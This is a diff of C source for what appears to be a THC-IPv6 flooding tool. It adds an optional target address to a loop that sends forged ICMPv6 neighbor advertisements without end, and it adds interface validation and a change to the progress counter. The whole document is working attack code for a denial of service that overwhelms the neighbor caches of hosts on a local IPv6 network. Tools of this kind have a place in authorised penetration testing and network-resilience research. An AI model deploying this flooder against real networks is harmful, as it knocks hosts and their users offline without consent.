@@ -12,7 +12,7 @@
 
 void help(char *prg) {
   printf("%s %s (c) 2013 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
-  printf("Syntax: %s interface\n\n", prg);
+  printf("Syntax: %s interface [target]\n\n", prg);
   printf("Flood the local network with neighbor advertisements.\n");
 //  printf("Use -r to use raw mode.\n\n");
   exit(-1);
@@ -27,20 +27,29 @@ int main(int argc, char *argv[]) {
   unsigned char *pkt = NULL;
   int pkt_len = 0, flags, rawmode = 0, count = 0;
 
-  if (argc < 2 || argc > 3 || strncmp(argv[1], "-h", 2) == 0)
-    help(argv[0]);
-
-  if (strcmp(argv[1], "-r") == 0) {
+  if (argc > 1 && strcmp(argv[1], "-r") == 0) {
     thc_ipv6_rawmode(1);
     rawmode = 1;
     argv++;
     argc--;
   }
 
+  if (argc < 2 || argc > 4 || strncmp(argv[1], "-h", 2) == 0)
+    help(argv[0]);
+
   srand(time(NULL) + getpid());
   setvbuf(stdout, NULL, _IONBF, 0);
 
   interface = argv[1];
+  if (thc_get_own_mac(interface) == NULL) {
+    fprintf(stderr, "Error: invalid interface %s\n", interface);
+    exit(-1);
+  }
+  if (argc == 3)
+    if ((dst = thc_resolve6(argv[2])) == NULL) {
+      fprintf(stderr, "Error: invalid target IPv6 address\n");
+      exit(-1);
+    }
 
   ip6 = malloc(16);
 
@@ -61,7 +70,7 @@ int main(int argc, char *argv[]) {
   memcpy(buf, ip6, 16);
   flags = ICMP6_NEIGHBORADV_OVERRIDE;
 
-  printf("Starting to flood network with neighbor advertisements on %s (Press Control-C to end, a dot is printed for every 100 packet):\n", interface);
+  printf("Starting to flood network with neighbor advertisements on %s (Press Control-C to end, a dot is printed for every 1000 packets):\n", interface);
   while (1) {
 
     for (i = 2; i < 6; i++)
@@ -77,7 +86,7 @@ int main(int argc, char *argv[]) {
     memcpy(buf + 10, ip6 + 10, 6);
     memcpy(&buf[20], mac + 2, 4);
 
-    if ((pkt = thc_create_ipv6(interface, PREFER_LINK, &pkt_len, ip6, dst, 255, 0, 0, 0, 0)) == NULL)
+    if ((pkt = thc_create_ipv6_extended(interface, PREFER_LINK, &pkt_len, ip6, dst, 255, 0, 0, 0, 0)) == NULL)
       return -1;
     if (thc_add_icmp6(pkt, &pkt_len, ICMP6_NEIGHBORADV, 0, flags, buf, sizeof(buf), 0) < 0)
       return -1;
@@ -90,7 +99,7 @@ int main(int argc, char *argv[]) {
 
     pkt = thc_destroy_packet(pkt);
 //    usleep(1);
-    if (count % 100 == 0)
+    if (count % 1000 == 0)
       printf(".");
   }
   return 0;
